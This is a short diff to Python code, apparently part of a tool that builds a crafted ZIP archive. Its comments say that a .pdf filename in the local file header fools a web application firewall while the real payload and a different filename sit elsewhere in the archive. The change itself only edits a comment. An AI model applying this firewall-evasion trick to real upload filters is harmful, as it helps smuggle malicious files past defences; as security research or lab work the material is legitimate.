@@ -50,7 +50,7 @@ class Zip:
     local_file_header += struct.pack('<H',len(filename1))        # filename length, 2 bytes
     local_file_header += b'\x00\x00'                             # extra field length
     local_file_header += filename1 # filename, the waf checks this and sees that the file ends in .pdf so it lets the file through
-    local_file_header += payload   # extra field, putting the payload (actual contents of the "pdf") here because it doesnt work if I put it after the filename2 in the central directory header
+    local_file_header += payload   # extra field, putting the payload (actual contents of the "pdf") here because it doesnt work if I put it after filename2 in the central directory header
 
     # Step 2. Building the central directory header
     central_directory  = b''
